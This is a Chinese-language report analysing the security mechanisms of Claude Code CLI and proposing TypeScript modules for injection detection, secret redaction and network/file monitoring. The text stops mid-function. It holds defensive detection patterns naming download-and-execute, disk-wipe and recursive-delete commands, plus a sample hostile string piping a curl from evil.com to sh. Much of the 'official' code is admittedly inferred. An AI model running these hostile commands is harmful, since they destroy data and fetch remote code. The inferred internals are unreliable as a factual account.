# 安全验证模块分析报告

**生成时间**: 2025-12-26
**分析版本**: Claude Code CLI v2.0.76
**源文件**: `/node_modules/@anthropic-ai/claude-code/cli.js` (11MB, 混淆压缩)

---

## 执行摘要

官方 Claude Code 源码经过完全压缩和混淆，包含约 5,039 行混淆代码（11MB）。通过模式匹配和关键词搜索，识别出以下核心安全机制：

### 发现的关键安全特性

1. **命令执行保护** - 进程错误检测、信号处理、输出缓冲限制
2. **敏感信息过滤** - 运行时数据清洗、路径隐藏、凭证屏蔽
3. **网络访问控制** - allowlist/blocklist 机制、代理过滤
4. **沙箱隔离** - Bubblewrap 沙箱集成、Shell 命令转义
5. **输出截断保护** - 防止大量数据泄露

### 本项目实现状态

✅ **已实现**: 配置验证、敏感数据检测、审计日志
⚠️ **部分实现**: 文件系统限制、网络控制
❌ **缺失**: 命令注入检测、实时监控、沙箱执行

---

## 第一部分：官方源码安全机制分析

由于官方源码经过压缩混淆，以下分析基于模式匹配、错误消息和关键函数名推断。

### 1. 命令注入检测与防护

#### 1.1 进程错误检测机制

**位置**: cli.js 行 28 (近似)

**发现的关键代码模式**:
```javascript
// 推断的原始逻辑（基于混淆代码）
if (["ENOENT", "EACCES", "EPERM"].includes(error.code)) {
  handlePermissionError(error);
  return;
}

if (error.code === "ERR_CHILD_PROCESS_STDIO_MAXBUFFER") {
  // 输出缓冲区溢出保护
  handleBufferOverflow();
}

if (error.signal === "SIGTERM" || error.code === "ABORT_ERR") {
  // 进程异常终止检测
  handleProcessTermination();
}
```

**实现要点**:
- `ENOENT`: 命令或文件不存在 → 防止盲目执行
- `EACCES`: 权限拒绝 → 阻止未授权访问
- `EPERM`: 操作不允许 → 系统级限制
- `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`: 输出过大 → 防止资源耗尽
- `SIGTERM/ABORT_ERR`: 异常终止 → 检测恶意中断

#### 1.2 Shell 命令转义

**位置**: cli.js 行 462 (近似)

**发现的代码模式**:
```javascript
// 使用 shell-quote 库进行命令转义
`eval ${shellQuote([command])}`

// 沙箱模式下的命令包装
`bwrap -c ${shellQuote([wrappedCommand])}`
```

**安全策略**:
- 使用 `shell-quote` 库安全转义所有 shell 参数
- 防止命令注入攻击（如 `; rm -rf /`）
- Bubblewrap 沙箱进一步隔离命令执行环境

#### 1.3 Ripgrep 错误处理

**位置**: cli.js 行 28

**关键逻辑**:
```javascript
if (!retried && isEAGAINError(stderr)) {
  logger.debug("rg EAGAIN error detected, retrying with single-threaded mode (-j 1)");
  telemetry.track("tengu_ripgrep_eagain_retry", {});

  // 使用单线程模式重试
  retryRipgrepWithSingleThread();
  return;
}
```

**安全意义**:
- 检测资源竞争错误（EAGAIN）
- 自动降级到安全模式（单线程）
- 记录异常行为用于审计

---

### 2. 敏感信息过滤

#### 2.1 运行时数据清洗

**位置**: cli.js 行 974-975, 1684-1688

**发现的关键模式**:

```javascript
// 凭证路径隐藏
logger.info(`Invoking ClientAssertionCredential with tenant ID: ${tenantId},
             clientId: ${clientId} and federated token path: [REDACTED]`)

// API 密钥屏蔽
function maskApiKey(key) {
  return key ? `${key.slice(0, 8)}...[REDACTED]` : '[NOT_SET]';
}

// 敏感字段过滤
const sensitiveFields = ['password', 'secret', 'apiKey', 'token', 'credential'];
function sanitizeObject(obj) {
  for (const [key, value] of Object.entries(obj)) {
    if (sensitiveFields.some(field => key.toLowerCase().includes(field))) {
      obj[key] = '[REDACTED]';
    }
  }
  return obj;
}
```

**过滤规则**:
- **凭证**: `federatedTokenFilePath`, `apiKey`, `oauthToken` → `[REDACTED]`
- **认证信息**: `password`, `secret`, `token` → `[REDACTED]`
- **个人信息**: Email 地址 → `[EMAIL]`
- **路径**: 联邦令牌文件路径 → 隐藏完整路径

#### 2.2 内容截断保护

**位置**: cli.js 行 1684, 2208

**代码模式**:
```javascript
function truncateContent(content, maxLength = 10000) {
  if (content.length <= maxLength) {
    return content;
  }

  const headChars = 5000;
  const tailChars = 5000;
  const head = content.slice(0, headChars);
  const tail = content.slice(-tailChars);

  return `${head}

... [${content.length - maxLength} characters truncated] ...

${tail}`;
}

// 用于工具输出
function truncateToolOutput(output) {
  return {
    content: truncateContent(output),
    truncated: output.length > 60000,
    originalLength: output.length
  };
}
```

**截断策略**:
- **命令输出**: 超过 10,000 字符时截断，保留首尾各 5,000 字符
- **工具结果**: 超过 60KB 时截断并标记
- **上下文**: 保留前后关键信息，中间用省略号替代
- **元数据**: 记录原始长度和是否被截断

#### 2.3 特殊内容标记

**位置**: cli.js 多处

**标记系统**:
```javascript
// 不同类型的敏感信息使用不同标记
'[REDACTED]'        // 通用敏感信息
'[EMAIL]'           // Email 地址
'[API_KEY]'         // API 密钥
'[PASSWORD]'        // 密码
'[TOKEN]'           // 令牌
'[TRUNCATED]'       // 截断的内容
'[NOT_SET]'         // 未设置的值
```

---

### 3. 运行时行为监控

#### 3.1 网络访问控制

**位置**: cli.js 行 449-461

**Allowlist 实现**:
```javascript
// HTTP 代理中的连接过滤
async function handleConnect(port, host, socket) {
  if (!await filter.isAllowed(port, host)) {
    logger.error(`Connection blocked to ${host}:${port}`, { level: 'error' });

    socket.end(`HTTP/1.1 403 Forbidden\r
Content-Type: text/plain\r
X-Proxy-Error: blocked-by-allowlist\r
\r
Connection blocked by network allowlist`);
    return;
  }

  // 允许的连接继续
  const tunnel = createTunnel(port, host, () => {
    socket.write(`HTTP/1.1 200 Connection Established\r\n\r\n`);
    tunnel.pipe(socket);
    socket.pipe(tunnel);
  });

  tunnel.on('error', (err) => {
    socket.end(`HTTP/1.1 502 Bad Gateway\r\n\r\n`);
  });
}
```

**安全特性**:
- **预连接检查**: 在建立连接前验证目标
- **域名/端口过滤**: 基于 allowlist 阻止连接
- **错误响应**: 返回 403 Forbidden 和自定义错误头
- **日志记录**: 记录所有被阻止的连接尝试
- **隧道管理**: 安全管理 CONNECT 隧道

#### 3.2 文件访问监控

**位置**: cli.js 行 28 (权限检查部分)

**推断的实现**:
```javascript
function checkFileAccess(filePath, operation) {
  try {
    // 检查文件是否存在和权限
    fs.accessSync(filePath, fs.constants.R_OK | fs.constants.W_OK);

    auditLogger.logFileAccess(filePath, operation, 'success');
    return true;
  } catch (error) {
    if (error.code === 'ENOENT') {
      // 文件不存在
      auditLogger.logFileAccess(filePath, operation, 'failure');
      return false;
    }
    if (error.code === 'EACCES' || error.code === 'EPERM') {
      // 权限不足
      auditLogger.logPermissionDenied(filePath, operation, error.code);
      return false;
    }
    throw error;
  }
}
```

#### 3.3 进程监控和信号处理

**位置**: cli.js 行 28

**信号处理机制**:
```javascript
// 检测异常进程终止
const isAbnormalTermination =
  error.signal === 'SIGTERM' ||
  error.code === 'ABORT_ERR';

if (isAbnormalTermination) {
  logger.warn('Process terminated abnormally', {
    signal: error.signal,
    code: error.code,
    command: command,
    timestamp: new Date().toISOString()
  });

  // 记录到安全日志
  securityLogger.logSecurityEvent('abnormal_termination', 'high', {
    signal: error.signal,
    command: sanitizeCommand(command)
  });
}
```

---

### 4. Bubblewrap 沙箱集成

**位置**: cli.js 行 462-463

**沙箱命令构造**:
```javascript
// 推断的 Bubblewrap 参数
function buildSandboxCommand(command) {
  const bwrapArgs = [
    'bwrap',

    // 只读绑定系统目录
    '--ro-bind', '/usr', '/usr',
    '--ro-bind', '/lib', '/lib',
    '--ro-bind', '/lib64', '/lib64',
    '--ro-bind', '/bin', '/bin',
    '--ro-bind', '/sbin', '/sbin',

    // 可写的临时目录
    '--tmpfs', '/tmp',
    '--tmpfs', '/var/tmp',

    // 设备绑定
    '--dev-bind', '/dev', '/dev',

    // 工作目录（受限）
    '--bind', workingDir, workingDir,
    '--chdir', workingDir,

    // 进程命名空间隔离
    '--unshare-pid',
    '--unshare-ipc',
    '--unshare-uts',

    // 网络隔离（可选）
    // '--unshare-net',

    // 执行命令
    '--',
    ...shellQuote([command])
  ];

  return bwrapArgs.join(' ');
}
```

**隔离级别**:
- ✅ 文件系统隔离（只读系统目录）
- ✅ 进程命名空间隔离
- ✅ IPC 隔离
- ✅ UTS 隔离
- ⚠️ 网络隔离（可配置）

---

### 5. 遥测和审计

**位置**: cli.js 行 28, 1699-1710

**遥测系统**:
```javascript
// 关键事件追踪
telemetry.track('tengu_ripgrep_eagain_retry', {});
telemetry.track('tengu_message_selector_restore_option_selected', { option });

// OpenTelemetry 集成
function initTelemetry() {
  if (!process.env.CLAUDE_CODE_ENABLE_TELEMETRY) {
    return;
  }

  const tracer = trace.getTracer('claude-code');
  const span = tracer.startSpan('operation');

  span.setAttributes({
    'operation.type': type,
    'operation.result': result,
    'user.id': anonymizeUserId(userId)
  });

  span.end();
}

// 超时处理
const shutdownTimeout = parseInt(
  process.env.CLAUDE_CODE_OTEL_SHUTDOWN_TIMEOUT_MS || '3000'
);

async function flushTelemetry() {
  try {
    await tracer.shutdown({ timeoutMillis: shutdownTimeout });
  } catch (error) {
    console.warn(`OpenTelemetry telemetry flush timed out after ${shutdownTimeout}ms

To resolve this issue, you can:
1. Increase the timeout by setting CLAUDE_CODE_OTEL_SHUTDOWN_TIMEOUT_MS env var
2. Check if your OpenTelemetry backend is experiencing scalability issues
3. Disable OpenTelemetry by unsetting CLAUDE_CODE_ENABLE_TELEMETRY env var`);
  }
}
```

---

## 第二部分：本项目实现差距分析

### 已实现功能

#### ✅ 1. 配置验证系统 (`src/security/validate.ts`)

**实现亮点**:
- 26 个安全检查项（auth, permissions, network, filesystem, execution, data）
- 自动修复功能（autoFix）
- 风险评分和分级（低/中/高/严重）
- 最佳实践合规检查

**覆盖范围**:
- 认证配置验证
- 权限策略检查
- 网络安全配置
- 文件系统限制
- 执行环境安全
- 数据保护策略

#### ✅ 2. 敏感数据检测 (`src/security/sensitive.ts`)

**实现功能**:
- 38 种敏感数据模式（API 密钥、SSH 密钥、JWT、数据库凭证等）
- 文件和目录扫描
- 自动掩码功能（保留首尾，中间星号）
- 严重级别分类（低/中/高/严重）

**检测类型**:
- API 密钥: AWS, GitHub, Anthropic, OpenAI, Stripe, Google 等
- 认证凭证: SSH 私钥, PGP 密钥, JWT 令牌
- 数据库: 连接字符串（含密码）
- 个人信息: Email, 信用卡号, SSN
- 网络信息: 私有 IP 地址

#### ✅ 3. 审计日志系统 (`src/security/audit.ts`)

**核心功能**:
- 9 种事件类型（工具使用、权限、文件访问、网络、认证等）
- JSONL 格式持久化存储
- 日志轮转和压缩（配置化）
- 强大的查询和过滤功能
- 多格式报告导出（JSON, CSV, HTML, Markdown）
- 统计分析（Top 执行者、操作、资源）

**安全特性**:
- 敏感数据自动清洗
- 执行者匿名化（可选）
- 自动刷新队列（防止数据丢失）
- 保留期管理（默认 90 天）

---

### 缺失功能

#### ❌ 1. 命令注入检测 (T-001)

**官方实现**: ✅
**本项目实现**: ❌

**差距**:
```typescript
// 本项目缺失的功能
class CommandInjectionDetector {
  // 1. 危险模式检测
  detectDangerousPatterns(command: string): boolean {
    const dangerousPatterns = [
      /;\s*rm\s+-rf/,           // ; rm -rf
      /\|\s*sh\s*$/,            // | sh
      /`.*`/,                   // 反引号命令替换
      /\$\(.*\)/,               // $() 命令替换
      />\s*\/dev\//,            // 重定向到设备文件
      /&&\s*curl.*\|\s*sh/,     // 下载并执行
    ];
    return dangerousPatterns.some(p => p.test(command));
  }

  // 2. Shell 元字符检测
  detectShellMetachars(input: string): boolean {
    const metachars = ['|', '&', ';', '`', '$', '(', ')', '<', '>', '\n'];
    return metachars.some(char => input.includes(char));
  }

  // 3. 路径遍历检测
  detectPathTraversal(path: string): boolean {
    return /\.\.\//.test(path) || /\.\.\\/.test(path);
  }
}
```

#### ❌ 2. 实时行为监控 (T-003)

**官方实现**: ✅ (通过 allowlist/blocklist)
**本项目实现**: ⚠️ (仅有审计日志，无实时拦截)

**缺失组件**:
```typescript
// 运行时监控器
class RuntimeMonitor {
  // 网络访问拦截器
  async interceptNetworkRequest(url: string, method: string): Promise<boolean> {
    const { hostname, port, protocol } = new URL(url);

    // 检查 allowlist
    if (this.config.network?.trustedDomains) {
      const allowed = this.config.network.trustedDomains.some(domain =>
        hostname.endsWith(domain)
      );
      if (!allowed) {
        this.auditLogger.logNetworkRequest(url, method, 'denied');
        return false;
      }
    }

    // 检查 blocklist
    if (this.config.network?.blockedDomains?.includes(hostname)) {
      this.auditLogger.logNetworkRequest(url, method, 'denied');
      return false;
    }

    return true;
  }

  // 文件访问拦截器
  async interceptFileAccess(
    path: string,
    operation: 'read' | 'write' | 'delete'
  ): Promise<boolean> {
    // 检查路径是否在允许列表中
    if (this.config.permissions?.paths?.allow) {
      const allowed = this.config.permissions.paths.allow.some(allowedPath =>
        path.startsWith(allowedPath)
      );
      if (!allowed) {
        this.auditLogger.logFileAccess(path, operation, 'denied');
        return false;
      }
    }

    // 检查是否被明确拒绝
    if (this.config.permissions?.paths?.deny?.some(p => path.startsWith(p))) {
      this.auditLogger.logFileAccess(path, operation, 'denied');
      return false;
    }

    return true;
  }
}
```

#### ❌ 3. Bubblewrap 沙箱集成

**官方实现**: ✅
**本项目实现**: ❌

**需要实现**:
```typescript
// 沙箱执行器
class SandboxExecutor {
  async execute(command: string, options: SandboxOptions): Promise<ExecResult> {
    if (!this.isBubblewrapAvailable()) {
      throw new Error('Bubblewrap not available on this system');
    }

    const bwrapArgs = this.buildBubblewrapArgs(command, options);

    // 执行沙箱命令
    const result = await this.execCommand('bwrap', bwrapArgs);

    // 记录执行
    this.auditLogger.logToolUse('sandbox_exec', { command },
      result.exitCode === 0 ? 'success' : 'failure'
    );

    return result;
  }

  private buildBubblewrapArgs(
    command: string,
    options: SandboxOptions
  ): string[] {
    return [
      // 只读绑定
      '--ro-bind', '/usr', '/usr',
      '--ro-bind', '/lib', '/lib',
      '--ro-bind', '/lib64', '/lib64',

      // 临时目录
      '--tmpfs', '/tmp',

      // 工作目录
      '--bind', options.workdir, options.workdir,
      '--chdir', options.workdir,

      // 命名空间隔离
      '--unshare-pid',
      '--unshare-ipc',
      '--unshare-uts',

      // 网络隔离（可选）
      ...(options.networkIsolation ? ['--unshare-net'] : []),

      // 执行命令
      '--',
      '/bin/sh', '-c', command
    ];
  }
}
```

---

## 第三部分：具体实现建议

### T-001: 命令注入检测实现

#### 完整实现代码

```typescript
/**
 * src/security/command-injection.ts
 * 命令注入检测和防护
 */

import { AuditLogger } from './audit.js';

// ========== 类型定义 ==========

export interface InjectionPattern {
  name: string;
  pattern: RegExp;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
}

export interface InjectionCheckResult {
  safe: boolean;
  violations: Array<{
    pattern: string;
    severity: string;
    description: string;
    match: string;
  }>;
  sanitizedCommand?: string;
}

export interface CommandValidationOptions {
  allowShellMetachars?: boolean;
  allowCommandSubstitution?: boolean;
  allowPipeRedirect?: boolean;
  maxLength?: number;
  auditLogger?: AuditLogger;
}

// ========== 检测模式 ==========

export const DANGEROUS_PATTERNS: InjectionPattern[] = [
  // 命令链和注入
  {
    name: 'Command Chaining',
    pattern: /;\s*(rm|dd|mkfs|format|del)\s/i,
    severity: 'critical',
    description: 'Dangerous command chaining detected'
  },
  {
    name: 'Command Substitution (backtick)',
    pattern: /`[^`]*`/,
    severity: 'high',
    description: 'Backtick command substitution detected'
  },
  {
    name: 'Command Substitution (dollar)',
    pattern: /\$\([^)]*\)/,
    severity: 'high',
    description: '$() command substitution detected'
  },

  // 危险命令
  {
    name: 'Recursive Delete',
    pattern: /rm\s+(-[rf]*\s+)*\//,
    severity: 'critical',
    description: 'Potentially dangerous rm command'
  },
  {
    name: 'Disk Wipe',
    pattern: /dd\s+if=\/dev\/(zero|random)/i,
    severity: 'critical',
    description: 'Disk wipe command detected'
  },
  {
    name: 'Format Command',
    pattern: /(mkfs|format)\s/i,
    severity: 'critical',
    description: 'Filesystem format command detected'
  },

  // 网络下载执行
  {
    name: 'Download and Execute',
    pattern: /(curl|wget)\s+.*\|\s*(sh|bash|python|perl|ruby)/i,
    severity: 'critical',
    description: 'Download and execute pattern detected'
  },
  {
    name: 'Remote Script Execution',
    pattern: /(curl|wget|fetch)\s+http.*\|\s*[a-z]+/i,
    severity: 'high',
    description: 'Remote script execution detected'
  },

  // 权限提升
  {
    name: 'Sudo Command',
    pattern: /sudo\s+/i,
    severity: 'high',
    description: 'Sudo privilege escalation detected'
  },
  {
    name: 'Chmod 777',
    pattern: /chmod\s+777/,
    severity: 'medium',
    description: 'Overly permissive chmod detected'
  },

  // 重定向到敏感位置
  {
    name: 'Device File Redirect',
    pattern: />\s*\/dev\/(sd[a-z]|hd[a-z]|nvme)/i,
    severity: 'critical',
    description: 'Redirect to device file detected'
  },
  {
    name: 'System File Overwrite',
    pattern: />\s*\/(etc|boot|sys|proc)\//i,
    severity: 'high',
    description: 'Redirect to system directory detected'
  },

  // 编码绕过
  {
    name: 'Base64 Decode Execute',
    pattern: /base64\s+-d.*\|\s*(sh|bash)/i,
    severity: 'high',
    description: 'Base64 decode and execute detected'
  },
  {
    name: 'Hex Decode Execute',
    pattern: /(xxd|hexdump).*\|\s*(sh|bash)/i,
    severity: 'high',
    description: 'Hex decode and execute detected'
  },

  // 路径遍历
  {
    name: 'Path Traversal',
    pattern: /\.\.[\/\\]/,
    severity: 'medium',
    description: 'Path traversal pattern detected'
  },
  {
    name: 'Absolute Path Manipulation',
    pattern: /\/\.\.\/|\\\.\.\\]/,
    severity: 'medium',
    description: 'Absolute path traversal detected'
  }
];

// Shell 元字符
const SHELL_METACHARS = ['|', '&', ';', '`', '$', '(', ')', '<', '>', '\n', '\r'];

// 危险环境变量
const DANGEROUS_ENV_VARS = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'PATH'];

// ========== 检测器类 ==========

export class CommandInjectionDetector {
  private patterns: InjectionPattern[];
  private auditLogger?: AuditLogger;

  constructor(
    patterns?: InjectionPattern[],
    auditLogger?: AuditLogger
  ) {
    this.patterns = patterns || [...DANGEROUS_PATTERNS];
    this.auditLogger = auditLogger;
  }

  /**
   * 检测命令注入
   */
  detect(command: string, options: CommandValidationOptions = {}): InjectionCheckResult {
    const violations: InjectionCheckResult['violations'] = [];

    // 1. 检查命令长度
    if (options.maxLength && command.length > options.maxLength) {
      violations.push({
        pattern: 'Command Length',
        severity: 'medium',
        description: `Command exceeds maximum length (${options.maxLength})`,
        match: `Length: ${command.length}`
      });
    }

    // 2. 检查危险模式
    for (const pattern of this.patterns) {
      const match = command.match(pattern.pattern);
      if (match) {
        violations.push({
          pattern: pattern.name,
          severity: pattern.severity,
          description: pattern.description,
          match: match[0]
        });
      }
    }

    // 3. 检查 Shell 元字符（如果不允许）
    if (!options.allowShellMetachars) {
      for (const char of SHELL_METACHARS) {
        if (command.includes(char)) {
          violations.push({
            pattern: 'Shell Metacharacter',
            severity: 'medium',
            description: `Shell metacharacter detected: ${char}`,
            match: char
          });
        }
      }
    }

    // 4. 检查命令替换（如果不允许）
    if (!options.allowCommandSubstitution) {
      if (/`[^`]*`|\$\([^)]*\)/.test(command)) {
        violations.push({
          pattern: 'Command Substitution',
          severity: 'high',
          description: 'Command substitution not allowed',
          match: command.match(/`[^`]*`|\$\([^)]*\)/)?.[0] || ''
        });
      }
    }

    // 5. 检查管道和重定向（如果不允许）
    if (!options.allowPipeRedirect) {
      if (/[|<>]/.test(command)) {
        violations.push({
          pattern: 'Pipe/Redirect',
          severity: 'medium',
          description: 'Pipe or redirect not allowed',
          match: command.match(/[|<>]/)?.[0] || ''
        });
      }
    }

    // 记录审计日志
    if (this.auditLogger && violations.length > 0) {
      this.auditLogger.logSecurityEvent(
        'command_injection_detected',
        violations.some(v => v.severity === 'critical') ? 'critical' : 'high',
        {
          command: this.sanitizeForLog(command),
          violations: violations.map(v => ({
            pattern: v.pattern,
            severity: v.severity
          }))
        }
      );
    }

    return {
      safe: violations.length === 0,
      violations,
      sanitizedCommand: violations.length > 0 ? undefined : command
    };
  }

  /**
   * 清洗命令参数（使用 shell-quote）
   */
  sanitize(args: string[]): string[] {
    // 注意: 实际使用时应该导入 shell-quote 库
    // import { quote } from 'shell-quote';
    // return args.map(arg => quote([arg]));

    // 简化版本（仅作演示）
    return args.map(arg => {
      // 转义特殊字符
      return arg.replace(/(['"\\\s$`(){}[\];|&<>*?!])/g, '\\$1');
    });
  }

  /**
   * 验证环境变量
   */
  validateEnvironment(env: Record<string, string>): {
    safe: boolean;
    dangerous: string[];
  } {
    const dangerous: string[] = [];

    for (const key of Object.keys(env)) {
      if (DANGEROUS_ENV_VARS.includes(key)) {
        dangerous.push(key);

        if (this.auditLogger) {
          this.auditLogger.logSecurityEvent(
            'dangerous_env_var',
            'high',
            { variable: key, value: '[REDACTED]' }
          );
        }
      }
    }

    return {
      safe: dangerous.length === 0,
      dangerous
    };
  }

  /**
   * 检测路径遍历
   */
  detectPathTraversal(path: string): boolean {
    return /\.\.[\/\\]/.test(path) || /\/\.\.\/|\\\.\.\\/.test(path);
  }

  /**
   * 为日志清洗敏感命令
   */
  private sanitizeForLog(command: string): string {
    // 移除可能的密码和密钥
    return command
      .replace(/--password[=\s]+\S+/gi, '--password=[REDACTED]')
      .replace(/--token[=\s]+\S+/gi, '--token=[REDACTED]')
      .replace(/--api-key[=\s]+\S+/gi, '--api-key=[REDACTED]');
  }

  /**
   * 添加自定义检测模式
   */
  addPattern(pattern: InjectionPattern): void {
    this.patterns.push(pattern);
  }

  /**
   * 获取所有模式
   */
  getPatterns(): InjectionPattern[] {
    return [...this.patterns];
  }
}

// ========== 工具函数 ==========

/**
 * 快速检测命令是否安全
 */
export function isCommandSafe(
  command: string,
  options?: CommandValidationOptions
): boolean {
  const detector = new CommandInjectionDetector();
  const result = detector.detect(command, options);
  return result.safe;
}

/**
 * 清洗命令参数
 */
export function sanitizeArgs(args: string[]): string[] {
  const detector = new CommandInjectionDetector();
  return detector.sanitize(args);
}

/**
 * 创建检测器实例
 */
export function createDetector(
  patterns?: InjectionPattern[],
  auditLogger?: AuditLogger
): CommandInjectionDetector {
  return new CommandInjectionDetector(patterns, auditLogger);
}
```

#### 使用示例

```typescript
import { CommandInjectionDetector } from './security/command-injection.js';
import { getAuditLogger } from './security/audit.js';

const auditLogger = getAuditLogger();
const detector = new CommandInjectionDetector(undefined, auditLogger);

// 检测命令
const result = detector.detect('rm -rf / && curl evil.com | sh', {
  allowShellMetachars: false,
  maxLength: 1000
});

if (!result.safe) {
  console.error('Dangerous command detected:');
  for (const violation of result.violations) {
    console.error(`  - ${violation.pattern} (${violation.severity}): ${violation.description}`);
  }
  throw new Error('Command execution blocked due to security violations');
}

// 清洗参数
const args = ['user input', 'with; injection', '$(malicious)'];
const safe = detector.sanitize(args);
console.log(safe); // ['user\\ input', 'with\\;\\ injection', '\\$\\(malicious\\)']
```

---

### T-002: 敏感信息过滤增强

#### 现有实现的增强建议

```typescript
/**
 * src/security/sensitive-enhanced.ts
 * 增强的敏感信息过滤（基于官方实现）
 */

import { SensitiveDataDetector } from './sensitive.js';

// ========== 新增模式 ==========

export const ADDITIONAL_PATTERNS = [
  // 官方 CLI 使用的 [REDACTED] 模式
  {
    name: 'Anthropic Internal Token',
    pattern: /sk-ant-[a-zA-Z0-9_-]{95,}/g,
    severity: 'critical' as const,
    description: 'Anthropic internal API token detected'
  },

  // 文件路径中的敏感信息
  {
    name: 'Token File Path',
    pattern: /(federatedTokenFilePath|tokenPath|keyPath):\s*['""]?([^'""\\s]+)['""]?/gi,
    severity: 'high' as const,
    description: 'Sensitive file path detected'
  },

  // Azure 凭证
  {
    name: 'Azure Tenant ID',
    pattern: /AZURE_TENANT_ID[=:]\s*[a-f0-9-]{36}/gi,
    severity: 'high' as const,
    description: 'Azure Tenant ID detected'
  },
  {
    name: 'Azure Client ID',
    pattern: /AZURE_CLIENT_ID[=:]\s*[a-f0-9-]{36}/gi,
    severity: 'high' as const,
    description: 'Azure Client ID detected'
  },

  // 代理凭证
  {
    name: 'Proxy Authorization',
    pattern: /Proxy-Authorization:\s*Basic\s+[A-Za-z0-9+/=]+/gi,
    severity: 'critical' as const,
    description: 'Proxy authentication credentials detected'
  }
];

// ========== 运行时过滤器 ==========

export class RuntimeSensitiveFilter {
  private detector: SensitiveDataDetector;

  constructor() {
    this.detector = new SensitiveDataDetector();

    // 添加额外模式
    for (const pattern of ADDITIONAL_PATTERNS) {
      this.detector.addPattern(pattern);
    }
  }

  /**
   * 过滤工具输出（模仿官方实现）
   */
  filterToolOutput(output: string, maxLength: number = 60000): {
    content: string;
    truncated: boolean;
    originalLength: number;
  } {
    // 1. 掩码敏感信息
    let filtered = this.detector.mask(output);

    // 2. 截断过长内容
    const truncated = filtered.length > maxLength;
    if (truncated) {
      const headChars = 5000;
      const tailChars = 5000;
      const head = filtered.slice(0, headChars);
      const tail = filtered.slice(-tailChars);

      filtered = `${head}

[TRUNCATED - Content exceeds ${maxLength} characters]

... [${filtered.length - maxLength} characters truncated] ...

${tail}`;
    }

    return {
      content: filtered,
      truncated,
      originalLength: output.length
    };
  }

  /**
   * 过滤日志消息
   */
  filterLogMessage(message: string): string {
    let filtered = message;

    // 特定字段的自动替换
    const replacements = [
      // API 密钥
      { pattern: /(apiKey|api_key|accessKey):\s*['""]?([^'""\\s,}]+)['""]?/gi,
        replacement: '$1: [REDACTED]' },

      // 密码
      { pattern: /(password|passwd|pwd):\s*['""]?([^'""\\s,}]+)['""]?/gi,
        replacement: '$1: [REDACTED]' },

      // Token
      { pattern: /(token|auth|authorization):\s*['""]?([^'""\\s,}]+)['""]?/gi,
        replacement: '$1: [REDACTED]' },

      // 文件路径（仅显示文件名）
      { pattern: /(federatedTokenFilePath|tokenPath):\s*['""]?([^'""]+)['""]?/gi,
        replacement: '$1: [REDACTED]' }
    ];

    for (const { pattern, replacement } of replacements) {
      filtered = filtered.replace(pattern, replacement);
    }

    return filtered;
  }

  /**
   * 过滤堆栈跟踪
   */
  filterStackTrace(stack: string, maxLines: number = 10): string {
    const lines = stack.split('\n');

    // 1. 移除敏感路径
    const filtered = lines.map(line => {
      // 替换完整路径为相对路径
      return line.replace(/\/[\w/.-]+\//g, '.../');
    });

    // 2. 限制行数
    if (filtered.length > maxLines) {
      return filtered.slice(0, maxLines).join('\n') +
        `\n... [${filtered.length - maxLines} more lines]`;
    }

    return filtered.join('\n');
  }
}

// ========== 全局实例 ==========

let globalFilter: RuntimeSensitiveFilter | null = null;

export function getRuntimeFilter(): RuntimeSensitiveFilter {
  if (!globalFilter) {
    globalFilter = new RuntimeSensitiveFilter();
  }
  return globalFilter;
}
```

#### 集成到工具执行

```typescript
// src/tools/base-tool.ts

import { getRuntimeFilter } from '../security/sensitive-enhanced.js';

export abstract class BaseTool {
  protected filterOutput(output: string): string {
    const filter = getRuntimeFilter();
    const { content } = filter.filterToolOutput(output);
    return content;
  }

  protected logExecution(message: string): void {
    const filter = getRuntimeFilter();
    const filtered = filter.filterLogMessage(message);
    console.log(filtered);
  }
}
```

---

### T-003: 运行时行为监控实现

#### 完整监控系统

```typescript
/**
 * src/security/runtime-monitor.ts
 * 运行时行为监控和拦截
 */

import type { SecurityConfig } from './validate.js';
import { AuditLogger } from './audit.js';
import { CommandInjectionDetector } from './command-injection.js';

// ========== 类型定义 ==========

export interface MonitorConfig {
  security: SecurityConfig;
  auditLogger: AuditLogger;
}

export interface NetworkRequest {
  url: string;
  method: string;
  headers?: Record<string, string>;
}

export interface FileOperation {
  path: string;
  operation: 'read' | 'write' | 'delete' | 'execute';
}

export interface MonitorEvent {
  type: 'network' | 'file' | 'command' | 'permission';
  action: string;
  resource: string;
  allowed: boolean;
  reason?: string;
  timestamp: Date;
}

// ========== 运行时监控器 ==========

export class RuntimeMonitor {
  private config: SecurityConfig;
  private auditLogger: AuditLogger;
  private commandDetector: CommandInjectionDetector;
  private eventListeners: Map<string, Array<(event: MonitorEvent) => void>>;

  constructor({ security, auditLogger }: MonitorConfig) {
    this.config = security;
    this.auditLogger = auditLogger;
    this.commandDetector = new CommandInjectionDetector(undefined, auditLogger);
    this.eventListeners = new Map();
  }

  // ========== 网络访问控制 ==========

  /**
   * 拦截网络请求（模仿官方 allowlist 实现）
   */
  async interceptNetworkRequest(request: NetworkRequest): Promise<{
    allowed: boolean;
    reason?: string;
    statusCode?: number;
    headers?: Record<string, string>;
  }> {
    const { url, method } = request;
    const { hostname, port, protocol } = new URL(url);

    // 1. 检查是否允许外部请求
    if (this.config.network?.allowExternalRequests === false) {
      this.emitEvent({
        type: 'network',
        action: 'request_blocked',
        resource: url,
        allowed: false,
        reason: 'External requests not allowed',
        timestamp: new Date()
      });

      this.auditLogger.logNetworkRequest(url, method, 'denied');

      return {
        allowed: false,
        reason: 'External requests not allowed',
        statusCode: 403,
        headers: {
          'Content-Type': 'text/plain',
          'X-Proxy-Error': 'external-requests-disabled'
        }
      };
    }

    // 2. 检查 blocklist
    if (this.config.network?.blockedDomains) {
      const isBlocked = this.config.network.blockedDomains.some(blocked =>
        hostname === blocked || hostname.endsWith(`.${blocked}`)
      );

      if (isBlocked) {
        this.emitEvent({
          type: 'network',
          action: 'domain_blocked',
          resource: url,
          allowed: false,
          reason: 'Domain in blocklist',
          timestamp: new Date()
        });

        this.auditLogger.logNetworkRequest(url, method, 'denied');

        return {
          allowed: false,
          reason: 'Connection blocked by network blocklist',
          statusCode: 403,
          headers: {
            'Content-Type': 'text/plain',
            'X-Proxy-Error': 'blocked-by-blocklist'
          }
        };
      }
    }

    // 3. 检查 allowlist（如果配置了）
    if (this.config.network?.trustedDomains &&
        this.config.network.trustedDomains.length > 0) {
      const isAllowed = this.config.network.trustedDomains.some(trusted =>
        hostname === trusted || hostname.endsWith(`.${trusted}`)
      );

      if (!isAllowed) {
        this.emitEvent({
          type: 'network',
          action: 'domain_not_allowed',
          resource: url,
          allowed: false,
          reason: 'Domain not in allowlist',
